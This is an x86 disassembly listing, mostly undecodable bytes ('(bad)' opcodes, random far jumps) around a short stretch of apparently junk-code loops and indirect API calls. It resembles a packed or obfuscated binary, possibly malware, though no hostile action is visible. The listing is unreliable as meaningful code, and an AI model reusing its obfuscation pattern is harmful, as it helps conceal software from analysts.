  4068eb:	lock mov eax,ds:0x97ee430c
  4068f1:	in     al,0x98
  4068f3:	fbld   TBYTE PTR [ebx-0x5b]
  4068f6:	push   0xffffff8d
  4068f8:	or     edi,DWORD PTR [eax+ebp*4-0x45]
  4068fc:	adc    bl,BYTE PTR [ecx]
  4068fe:	pop    ds
  4068ff:	sub    al,0xd6
  406901:	enter  0x453b,0xc6
  406905:	jnp    0x40692c
  406907:	mov    dh,0x39
  406909:	test   eax,0x634c0fb2
  40690e:	jmp    0x319a:0xbc4174b
  406915:	pop    eax
  406916:	mov    bl,0x64
  406918:	scas   al,BYTE PTR es:[edi]
  406919:	lock cmp al,0xe3
  40691c:	aaa    
  40691d:	rol    BYTE PTR [edx+ebx*2-0x59],cl
  406921:	retf   
  406922:	adc    DWORD PTR [ebp-0x2b6322cc],ecx
  406928:	lahf   
  406929:	jns    0x4068d2
  40692b:	daa    
  40692c:	and    ecx,DWORD PTR [ebp-0x3ee41612]
  406932:	pop    ds
  406933:	mov    esi,0x953330b4
  406938:	sub    dl,ah
  40693a:	and    ecx,0xdc670dc7
  406940:	(bad)  
  406942:	xchg   ebp,eax
  406943:	sub    esi,DWORD PTR [ecx]
  406945:	outs   dx,DWORD PTR ds:[esi]
  406946:	mov    eax,0x59ac4918
  40694b:	retf   
  40694c:	sub    eax,0x9ca2cd5c
  406951:	ja     0x40695a
  406953:	dec    edx
  406954:	sub    al,0x83
  406956:	xchg   ebp,eax
  406957:	xchg   ecx,eax
  406958:	sbb    eax,0x77a86283
  40695d:	sub    DWORD PTR [edx],ebp
  40695f:	aas    
  406960:	pop    eax
  406961:	nop
  406962:	pop    esi
  406963:	ret    0xb0bb
  406966:	xchg   esp,eax
  406967:	push   edi
  406968:	jne    0x4069d3
  40696a:	mov    esi,0x1f025830
  40696f:	mov    bh,0xd7
  406971:	retf   0xcbb9
  406974:	aad    0x5f
  406976:	inc    edi
  406977:	mov    cl,0xa3
  406979:	data16 xlat BYTE PTR ds:[ebx]
  40697b:	aad    0xe4
  40697d:	mov    esp,DWORD PTR [edi]
  40697f:	adc    al,0x9f
  406981:	push   esi
  406982:	stc    
  406983:	lahf   
  406984:	ret    0x8543
  406987:	jge    0x406961
  406989:	and    DWORD PTR [ecx],ecx
  40698b:	add    BYTE PTR [edx+0x11],dl
  40698e:	inc    ebx
  40698f:	ror    bl,1
  406991:	sub    eax,0x71ca1dd1
  406996:	and    eax,0x67ac0600
  40699b:	jg     0x406953
  40699d:	mov    ds,WORD PTR [ebx+ebx*4+0x17]
  4069a1:	add    edi,edi
  4069a3:	push   0x28
  4069a5:	jnp    0x40693d
  4069a7:	mov    dh,0x66
  4069a9:	mov    DWORD PTR [ebp+0x3d],esp
  4069ac:	jmp    0x4069e8
  4069ae:	out    dx,eax
  4069af:	or     DWORD PTR [ecx+0x5908fe07],0x657a31f0
  4069b9:	push   esp
  4069ba:	dec    eax
  4069bb:	xor    DWORD PTR [ecx-0x33],esi
  4069be:	jmp    0x406986
  4069c0:	pop    edx
  4069c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069c2:	jbe    0x406a09
  4069c4:	adc    al,0x17
  4069c6:	leave  
  4069c7:	frndint 
  4069c9:	mov    dl,0x1
  4069cb:	int    0x6
  4069cd:	jno    0x4069d4
  4069cf:	arpl   di,si
  4069d1:	cmp    DWORD PTR [esi-0x4a4d3c29],eax
  4069d7:	lea    edi,[ebx]
  4069d9:	xchg   esi,eax
  4069da:	shr    DWORD PTR [ebx-0x72],1
  4069dd:	icebp  
  4069de:	adc    al,0x72
  4069e0:	data16 add al,0x62
  4069e3:	pusha  
  4069e4:	lds    ebx,FWORD PTR [eax+ecx*2]
  4069e7:	sbb    al,0x9a
  4069e9:	call   0xf0beafb
  4069ee:	ret    0xf77c
  4069f1:	push   cs
  4069f2:	ins    DWORD PTR es:[edi],dx
  4069f3:	stos   DWORD PTR es:[edi],eax
  4069f4:	call   0xab8:0xc264645e
  4069fb:	inc    edx
  4069fc:	sbb    al,0x3e
  4069fe:	push   eax
  4069ff:	cmp    eax,0x53c01a60
  406a04:	test   DWORD PTR [edx-0x30],esi
  406a07:	jnp    0x40698b
  406a09:	aaa    
  406a0a:	aas    
  406a0b:	and    DWORD PTR [ebx+0x24664f55],0x3e
  406a12:	fwait
  406a13:	inc    edi
  406a14:	fwait
  406a15:	lea    ecx,[ecx+0x42fe5372]
  406a1b:	loope  0x406a10
  406a1d:	sahf   
  406a1e:	in     al,0x55
  406a20:	push   0xffffffa5
  406a22:	enter  0x7018,0xc
  406a26:	mov    ecx,0x3ee6ee71
  406a2b:	aam    0xf0
  406a2d:	rol    DWORD PTR [eax-0xd09c855],0x39
  406a34:	fnstsw WORD PTR [edx-0x5d6a983f]
  406a3a:	sar    ah,cl
  406a3c:	cwde   
  406a3d:	inc    ecx
  406a3e:	and    DWORD PTR [esi],ebp
  406a40:	rcr    BYTE PTR [ecx+eiz*1],cl
  406a43:	push   esp
  406a44:	(bad)  
  406a45:	mov    ds:0x2abd3955,al
  406a4a:	and    edi,DWORD PTR [esi]
  406a4c:	ret    0x75bd
  406a4f:	adc    DWORD PTR [ecx],ecx
  406a51:	lds    edi,FWORD PTR [ebp-0x58]
  406a54:	xchg   BYTE PTR [esi+0x8],bl
  406a57:	add    eax,0x2bfef6b1
  406a5c:	sbb    edx,DWORD PTR [esi+eiz*4+0x4ba16529]
  406a63:	ins    DWORD PTR es:[edi],dx
  406a64:	popf   
  406a65:	dec    ecx
  406a66:	mov    esi,0xfeb930e6
  406a6b:	or     eax,0x7b3094c0
  406a70:	sbb    eax,0x63298a3d
  406a75:	xlat   BYTE PTR ds:[ebx]
  406a76:	mov    esp,esp
  406a78:	pop    edi
  406a79:	xchg   edi,eax
  406a7a:	repnz sub al,0x6f
  406a7d:	xchg   ebp,eax
  406a7e:	xor    al,0xdf
  406a80:	xchg   ecx,eax
  406a81:	pop    esp
  406a82:	xlat   BYTE PTR ds:[ebx]
  406a83:	inc    ebp
  406a84:	sub    eax,0xfb9787d5
  406a89:	pop    esi
  406a8a:	and    eax,0x113c8c22
  406a8f:	xchg   ebx,eax
  406a90:	push   0x1c
  406a92:	adc    eax,0xdd156102
  406a97:	mov    bh,0xe8
  406a99:	push   0x3b
  406a9b:	lahf   
  406a9c:	pop    edi
  406a9d:	je     0x406b09
  406a9f:	push   es
  406aa0:	nop
  406aa1:	pushf  
  406aa2:	cli    
  406aa3:	into   
  406aa4:	jmp    0x88d11140
  406aa9:	xor    al,0xd7
  406aab:	hlt    
  406aac:	scas   al,BYTE PTR es:[edi]
  406aad:	jg     0x406abe
  406aaf:	jge    0x406aed
  406ab1:	fs adc eax,0xef688b13
  406ab7:	pop    esp
  406ab8:	or     eax,0x76fcd59d
  406abd:	test   bh,0x8d
  406ac0:	xor    eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x23
  406c9b:	sbb    bl,BYTE PTR [ebx]
  406c9d:	jmp    0x70b131b9
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c33
  406ca7:	out    0x1e,al
  406ca9:	xchg   edi,eax
  406cab:	xor    al,0xc
  406cad:	les    edi,FWORD PTR [esi-0x4463871e]
  406cb3:	sub    ebp,DWORD PTR gs:[ebx+edx*2+0x628ced76]
  406cbb:	outs   dx,DWORD PTR ds:[esi]
  406cbc:	leave  
  406cbd:	xchg   ebx,eax
  406cbe:	addr16 push esp
  406cc0:	pop    esi
  406cc1:	xchg   esi,eax
  406cc2:	jle    0x406d35
  406cc4:	inc    ebx
  406cc5:	int3   
  406cc6:	dec    eax
  406cc7:	dec    esi
  406cc8:	mov    bh,0xaf
  406cca:	sub    BYTE PTR [ecx+ebx*8+0x28],ch
  406cce:	jmp    0xe250:0xa6edc0d0
  406cd5:	xchg   BYTE PTR [ebx-0x70],bl
  406cd8:	pop    ebp
  406cd9:	or     dl,BYTE PTR [eax+0x74c982c0]
  406cdf:	push   eax
  406ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ce1:	test   al,0xe3
  406ce3:	pusha  
  406ce4:	aaa    
  406ce5:	(bad)  
  406ce6:	aad    0x85
  406ce8:	es cld 
  406cea:	xchg   ebp,eax
  406ceb:	dec    ebx
  406cec:	mov    ah,bh
  406cee:	sbb    DWORD PTR [edi+0x10f17f3],eax
  406cf4:	push   ds
  406cf5:	cmc    
  406cf6:	mov    ds:0x15da5937,al
  406cfb:	(bad)  
  406cfc:	fmul   QWORD PTR [ecx+esi*4]
  406cff:	xchg   DWORD PTR [eax],eax
  406d01:	cmc    
  406d02:	imul   edi,ebp,0xffffffbf
  406d05:	sub    eax,0x4421170f
  406d0a:	in     al,dx
  406d0b:	repz xor al,0x7d
  406d0e:	jmp    0xb325:0x3e524c38
  406d15:	push   esi
  406d16:	or     DWORD PTR [edi+eiz*2],ecx
  406d19:	xchg   edx,eax
  406d1a:	cmc    
  406d1b:	dec    DWORD PTR es:[ecx-0x2e]
  406d1f:	push   cs
  406d20:	int3   
  406d21:	test   BYTE PTR [edx+0x1ad04c2d],0xc9
  406d28:	dec    ecx
  406d29:	push   DWORD PTR [edx]
  406d2b:	and    BYTE PTR [ebx+0x30],0xf4
  406d2f:	and    al,0xd8
  406d31:	popf   
  406d32:	fldenv [ebp-0x56a99f6e]
  406d38:	shr    esp,0xdb
  406d3b:	fimul  DWORD PTR [edi]
  406d3d:	dec    esp
  406d3e:	xor    eax,0x9c5a8c15
  406d43:	jle    0x406d8a
  406d45:	sbb    eax,0x95e4dc2e
  406d4a:	std    
  406d4b:	inc    esi
  406d4c:	adc    DWORD PTR ds:0x15126c35,0x58
  406d53:	je     0x406dc4
  406d55:	jl     0x406d95
  406d57:	call   0x57b0:0x8f03ca26
  406d5e:	(bad)  
  406d5f:	add    eax,0x2f9fcae0
  406d64:	xchg   esi,eax
  406d65:	leave  
  406d66:	or     DWORD PTR [esi-0x78],eax
  406d69:	inc    DWORD PTR [edi+eiz*2]
  406d6c:	cmp    edi,DWORD PTR [edx]
  406d6e:	adc    eax,0x9b0fd9a1
  406d73:	mov    ah,0x50
  406d75:	(bad)  
  406d76:	test   DWORD PTR [edi-0x40],0x83d5afdb
  406d7d:	push   esi
  406d7e:	mov    edx,0x2575898e
  406d83:	jnp    0x406d5c
  406d85:	sahf   
  406d86:	je     0x406d32
  406d88:	cmp    edi,DWORD PTR [eax]
  406d8a:	leave  
  406d8b:	out    dx,eax
  406d8c:	cmc    
  406d8d:	retf   0xfafe
  406d90:	sbb    dh,al
  406d92:	mov    cl,BYTE PTR [ecx+edx*4]
  406d95:	pop    ds
  406d96:	fsubr  st(3),st
  406d98:	mov    esp,0x22d83cd4
  406d9d:	inc    eax
  406d9e:	inc    ecx
  406d9f:	scas   al,BYTE PTR es:[edi]
  406da0:	mov    cl,0xec
  406da2:	test   BYTE PTR gs:[edx],cl
  406da5:	pop    edi
  406da6:	lods   eax,DWORD PTR ds:[esi]
  406da7:	or     al,0xbe
  406da9:	scas   al,BYTE PTR es:[edi]
  406daa:	pop    ebx
  406dab:	fnstsw WORD PTR [ecx+esi*8]
  406dae:	xchg   ecx,eax
  406daf:	fcom   QWORD PTR [ebx-0xe3647d5]
  406db5:	or     al,0xeb
  406db7:	sysexit 
  406db9:	bound  esp,QWORD PTR [ebp+0x17]
  406dbc:	jns    0x406dc1
  406dbe:	mov    ebx,0x7c192bf4
  406dc3:	shl    BYTE PTR [esi],1
  406dc5:	mov    ds:0xdc2a5f0c,eax
  406dca:	enter  0x5d7f,0xed
  406dce:	lock jmp 0xa293:0x861342c3
  406dd6:	xor    esi,DWORD PTR [eax+esi*8-0x72d43d3]
  406ddd:	bnd jge 0x406e24
  406de0:	cs sub esp,eax
  406de3:	cmc    
  406de4:	jo     0x406d6f
  406de6:	adc    dl,BYTE PTR [edx+eax*1]
  406de9:	pop    edx
  406dea:	pop    es
  406deb:	pop    eax
  406dec:	cmp    dh,BYTE PTR [esi-0x75b946bd]
  406df2:	sbb    eax,0xc6c92b9a
  406df7:	cmp    edx,edi
  406df9:	mov    ebx,0xdb5dc05f
  406dfe:	bound  edx,QWORD PTR [edx-0x44c4b983]
  406e04:	into   
  406e05:	int    0xf6
  406e07:	rcr    ch,cl
  406e09:	mov    ds:0xe0191d51,eax
  406e0e:	inc    eax
  406e0f:	sbb    DWORD PTR [eax+ecx*1],ebp
  406e12:	mov    ds:0xcc9487af,al
  406e17:	inc    edi
  406e18:	enter  0xa840,0x5b
  406e1c:	mov    esi,0x480bdc1d
  406e21:	shr    ebx,0x96
  406e24:	mov    WORD PTR [edx+0x65],cs
  406e27:	lock inc ecx
  406e29:	cmp    edi,DWORD PTR [edi]
  406e2b:	repz out 0xf9,al
  406e2e:	push   0x7a
  406e30:	sub    DWORD PTR [esi],edx
  406e32:	pop    eax
  406e33:	mov    edi,0xf3f9ac1e
  406e38:	mov    ebx,0xf6596f77
  406e3d:	rcr    ebx,0x20
  406e40:	in     eax,0x9d
  406e42:	or     BYTE PTR [ebx],bh
  406e44:	mov    bl,0x8b
  406e46:	pop    esi
  406e47:	(bad)  
  406e48:	ficomp DWORD PTR [ebx]
  406e4a:	cmp    al,0x96
  406e4c:	loope  0x406ddf
  406e4e:	mov    ch,0x8b
  406e50:	lahf   
  406e51:	lahf   
  406e52:	pop    ss
  406e53:	inc    edx
  406e54:	sbb    DWORD PTR [ecx-0x6d],edx
  406e57:	pop    esp
  406e58:	and    eax,0x87244c0c
  406e5d:	push   0x3d
  406e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e60:	push   ebp
  406e61:	jmp    0x406e27
  406e63:	ror    DWORD PTR [esp+eiz*4-0x4c],1
  406e67:	cmp    al,0x5e
  406e69:	imul   edx,DWORD PTR [edx-0x39],0xffffffc8
  406e6d:	mov    ah,0x40
  406e6f:	jmp    0x3ab3:0x3c2135d9
  406e76:	test   DWORD PTR [edx],ecx
  406e78:	cli    
  406e79:	int    0xd2
  406e7b:	cmp    eax,0xfa020aae
  406e80:	cmp    DWORD PTR [ebx-0x4d42159d],ebp
  406e86:	fild   DWORD PTR [esi-0x2a8b7302]
  406e8c:	pop    esi
  406e8d:	mov    ah,BYTE PTR [esi]
  406e8f:	in     al,0xe5
  406e91:	mov    gs:0x11e3a44e,al
  406e97:	push   esp
  406e98:	ss stc 
  406e9a:	pushf  
  406e9b:	push   ebx
  406e9c:	sbb    BYTE PTR [edx+ecx*8-0x51f2688c],al
  406ea3:	cmp    BYTE PTR [ecx-0x56],dl
  406ea6:	sbb    eax,0x5c1d248d
  406eab:	jmp    0xf370:0x290d8b52
  406eb2:	mov    BYTE PTR [esi],0x75
  406eb5:	inc    esi
  406eb6:	xchg   ebx,eax
  406eb7:	test   ebx,esp
  406eb9:	or     ah,bh
  406ebb:	mov    esi,0xa9d781ed
  406ec0:	fstp   DWORD PTR [ebx+ebp*2-0x7]
  406ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ec5:	lahf   
  406ec6:	and    eax,0xe0616358
  406ecb:	sti    
  406ecc:	lods   eax,DWORD PTR ds:[esi]
  406ecd:	inc    edi
  406ece:	stos   BYTE PTR es:[edi],al
  406ecf:	and    BYTE PTR [edi-0x72],dl
  406ed2:	aam    0x31
  406ed4:	push   ecx
  406ed5:	push   0x5e3047e1
  406eda:	mov    bl,0xf0
  406edc:	mov    eax,DWORD PTR [ebp-0x7ac63fa2]
  406ee2:	jmp    0x406ead
  406ee4:	(bad)  
  406ee5:	std    
  406ee6:	adc    ah,BYTE PTR [edx-0x5d]
  406ee9:	test   bh,cl
  406eeb:	aam    0xcd
  406eed:	shld   DWORD PTR [ecx],esp,cl
  406ef0:	sub    dh,BYTE PTR [eax-0x2ceca5d7]
  406ef6:	pop    esi
  406ef7:	and    DWORD PTR [edx+0x4316388a],edx
  406efd:	bound  ebp,QWORD PTR [edi]
  406eff:	adc    al,0x6e
  406f01:	sbb    DWORD PTR [edx],ebx
  406f03:	aad    0xed
  406f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f06:	(bad)  
  406f07:	icebp  
  406f08:	dec    ebx
  406f09:	add    al,0xbe
  406f0b:	cld    
  406f0c:	aaa    
  406f0d:	add    eax,0x8a8099e5
  406f12:	jle    0x406edf
  406f14:	or     eax,0xea7efcf8
  406f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f1a:	xchg   ebp,eax
  406f1b:	(bad)  
  406f1c:	(bad)  [edx-0x95877e3]
  406f22:	into   
  406f23:	dec    ecx
  406f24:	jp     0x406ef8
  406f26:	push   0xffffff8b
  406f28:	mov    eax,0xcde044e5
  406f2d:	push   edx
  406f2e:	adc    ecx,edi
  406f30:	cli    
  406f31:	icebp  
  406f32:	pop    ebp
  406f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f34:	xlat   BYTE PTR ds:[ebx]
  406f35:	arpl   WORD PTR [ecx-0x7d947e6],di
  406f3b:	aad    0xa9
  406f3d:	dec    ecx
  406f3e:	or     eax,0x910d80b8
  406f43:	xchg   ecx,eax
  406f44:	test   eax,0xe4a3acb3
  406f49:	sbb    al,0x92
  406f4b:	ret    0x40d8
  406f4e:	and    al,0x22
  406f50:	imul   edx,esp,0xffffffcb
  406f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f54:	sti    
  406f55:	popa   
  406f56:	push   0x208e43df
  406f5b:	mov    ch,0xae
  406f5d:	fsubrp st(5),st
  406f5f:	sbb    DWORD PTR [ecx+0x476b940c],esi
  406f65:	mov    BYTE PTR [esi+0x1841029f],ch
  406f6b:	push   edx
  406f6c:	rcr    BYTE PTR [ecx+0x17],cl
  406f6f:	into   
  406f70:	cmp    BYTE PTR [ebp-0x383a2ae5],al
  406f76:	loop   0x406faf
  406f78:	pusha  
  406f79:	dec    ecx
  406f7a:	sub    al,0x1f
  406f7c:	sbb    DWORD PTR [edx+ebx*8+0xf3b541c],ebp
  406f83:	int3   
  406f84:	adc    edx,ebx
  406f86:	gs pop esp
  406f88:	inc    esp
  406f89:	push   esi
  406f8a:	cmp    DWORD PTR [ecx+edx*1+0x1c],ecx
  406f8e:	cdq    
  406f8f:	inc    eax
  406f90:	pusha  
  406f91:	jno    0x406f57
  406f93:	cmp    dl,BYTE PTR [ebp+0x17245ad1]
  406f99:	shl    ch,1
  406f9b:	xor    eax,0x31fceb5d
  406fa0:	outs   dx,BYTE PTR ds:[esi]
  406fa1:	stos   DWORD PTR es:[edi],eax
  406fa2:	fld    TBYTE PTR ds:[ebp-0x14204258]
  406fa9:	jo     0x406f54
  406fab:	pop    eax
  406fac:	push   ss
  406fad:	pop    eax
  406fae:	push   0x1
  406fb0:	ins    BYTE PTR es:[edi],dx
  406fb1:	mov    al,0xf9
  406fb3:	jb     0x406fbd
  406fb5:	test   al,0x17
  406fb7:	jmp    0xed62:0x5c71a35c
  406fbe:	pop    ebx
  406fbf:	ret    
  406fc0:	mov    bl,0x2
  406fc2:	in     eax,dx
  406fc3:	fsubrp st(0),st
  406fc5:	sub    al,0x6b
  406fc7:	adc    esp,ebx
  406fc9:	or     eax,0xf051640d
  406fce:	js     0x406fe4
  406fd0:	xlat   BYTE PTR ds:[ebx]
  406fd1:	ror    DWORD PTR [ebp+0x25],0xcf
  406fd5:	xchg   edx,eax
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR ds:0xc74ee244,sp
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x406ff1
  407018:	shr    esp,1
  40701a:	jnp    0x406fee
  40701c:	das    
  40701d:	fdiv   DWORD PTR [ebx-0x1a]
  407020:	sub    al,0xad
  407022:	popf   
  407023:	sbb    BYTE PTR [esi+ecx*4+0x4f],cl
  407027:	aaa    
  407028:	aad    0x63
  40702a:	cmp    eax,0x8d828286
  40702f:	xchg   esi,eax
  407030:	out    0x65,al
  407032:	add    al,0xc5
  407034:	cmc    
  407035:	xchg   BYTE PTR [esi+0x75],cl
  407038:	or     DWORD PTR [ebx+0x3b],ebx
  40703b:	bound  esi,QWORD PTR [ebp+0x33a18ea4]
  407041:	sub    bl,BYTE PTR [ebx]
  407043:	xchg   BYTE PTR [edi-0x67],bh
  407046:	push   edi
  407047:	and    DWORD PTR [esi],ecx
  407049:	aaa    
  40704a:	loopne 0x4070a6
  40704c:	push   cs
  40704d:	enter  0xb32,0x49
  407051:	ret    0x9716
  407054:	pop    esi
  407055:	int    0x5
  407057:	push   ebx
  407058:	mov    ecx,DWORD PTR [esi+0x5e733944]
  40705e:	mov    cl,0xfc
  407060:	xor    eax,0x5
  407063:	jge    0x40703a
  407065:	lock adc bh,BYTE PTR [edx-0x7d]
  407069:	out    0x2,al
  40706b:	das    
  40706c:	push   esp
  40706d:	mov    ds:0xa8ad7b60,eax
  407072:	cmp    al,0x38
  407074:	out    0x57,al
  407076:	adc    esp,DWORD PTR [ecx-0x49be635d]
  40707c:	pop    ds
  40707d:	xlat   BYTE PTR ds:[ebx]
  40707e:	xchg   ecx,eax
  40707f:	int3   
  407080:	and    esi,DWORD PTR [ebp+0x64ef7132]
  407086:	push   esi
  407087:	nop
  407088:	sub    ecx,eax
  40708a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40708b:	sbb    dl,BYTE PTR [eax]
  40708d:	test   al,0xb
  40708f:	dec    esp
  407090:	clc    
  407091:	in     eax,dx
  407092:	mov    es,WORD PTR [edx-0x4b]
  407095:	int3   
  407096:	and    BYTE PTR [esi],ah
  407098:	and    ecx,DWORD PTR [ecx+0x6]
  40709b:	sub    DWORD PTR ds:0x4ac020c1,esp
  4070a1:	es in  al,dx
  4070a3:	sub    DWORD PTR [eax+0x7f657162],ecx
  4070a9:	and    ebp,DWORD PTR gs:[ebp+0x36]
  4070ad:	jecxz  0x407069
  4070af:	(bad)  
  4070b0:	leave  
  4070b1:	int3   
  4070b2:	and    bh,bh
  4070b4:	pop    es
  4070b5:	sahf   
  4070b6:	(bad)  
  4070b7:	or     DWORD PTR cs:[ebx-0x33af6ec7],edi
  4070be:	les    esi,FWORD PTR [esi-0x70df53b3]
  4070c4:	mov    edi,DWORD PTR [edx-0x2dbe66ef]
  4070ca:	xchg   ebp,eax
  4070cb:	loopne 0x4070cd
  4070cd:	or     BYTE PTR [esp+esi*4],0x2c
  4070d1:	stc    
  4070d2:	push   cs
  4070d3:	inc    di
  4070d5:	dec    edi
  4070d6:	jecxz  0x407091
  4070d8:	or     dl,bh
  4070da:	pop    ecx
  4070db:	daa    
  4070dc:	fist   WORD PTR [esi-0x55]
  4070df:	scas   al,BYTE PTR es:[edi]
  4070e0:	xchg   BYTE PTR [ecx],ah
  4070e2:	rcr    ecx,0xad
  4070e5:	mov    al,al
  4070e7:	push   cs
  4070e8:	aad    0x2f
  4070ea:	inc    esp
  4070eb:	adc    DWORD PTR [eax-0x413aaff0],0xffffffde
  4070f2:	rcr    DWORD PTR [esi],1
  4070f4:	mov    ds:0x41b8eff7,al
  4070f9:	mul    BYTE PTR [ecx]
  4070fb:	inc    ecx
  4070fc:	loopne 0x4070bd
  4070fe:	cdq    
  4070ff:	pop    edx
  407100:	das    
  407101:	or     esp,eax
  407103:	or     al,0x77
  407105:	push   es
  407106:	mov    esi,0x956eb2b
  40710b:	out    0x87,eax
  40710d:	cmp    dl,BYTE PTR [esi-0x7c4c927c]
  407113:	in     eax,dx
  407114:	popf   
  407115:	lods   al,BYTE PTR ds:[esi]
  407116:	je     0x40717f
  407118:	inc    eax
  407119:	xchg   ebx,eax
  40711a:	jae    0x4070c1
  40711c:	imul   ebp,DWORD PTR [edx-0x5a723875],0xffffffd8
  407123:	ret    
  407124:	xor    bl,BYTE PTR [ebp+eiz*1-0x3a68c3a9]
  40712b:	pop    ebp
  40712c:	(bad)  
  40712d:	sbb    al,0xcd
  40712f:	shr    BYTE PTR [edi+0x11a7f8d2],1
  407135:	xchg   esp,eax
  407136:	outs   dx,DWORD PTR ds:[esi]
  407137:	repnz push edi
  407139:	data16 add al,0xb7
  40713c:	sub    eax,0x368211d6
  407141:	cmp    eax,0xebeff527
  407146:	dec    eax
  407147:	mov    ch,dl
  407149:	adc    edx,DWORD PTR [esi+0x24]
  40714c:	stos   DWORD PTR es:[edi],eax
  40714d:	test   DWORD PTR [ecx+ebx*1],eax
  407150:	(bad)  
  407151:	loope  0x407155
  407153:	or     eax,DWORD PTR [edx]
  407155:	cdq    
  407156:	pop    edi
  407157:	xchg   esi,eax
  407158:	outs   dx,DWORD PTR ds:[esi]
  407159:	mov    eax,0xdfe79d01
  40715e:	cmp    cl,BYTE PTR [ebx+eiz*8+0x30441415]
  407165:	mov    ds:0x6172c8a0,al
  40716a:	repnz sahf 
  40716c:	add    DWORD PTR [ecx+eax*1],0xffffffff
  407170:	retf   
  407171:	or     DWORD PTR [ebp+0x37],esi
  407174:	(bad)  
  407175:	mov    ds:0x21053c7,eax
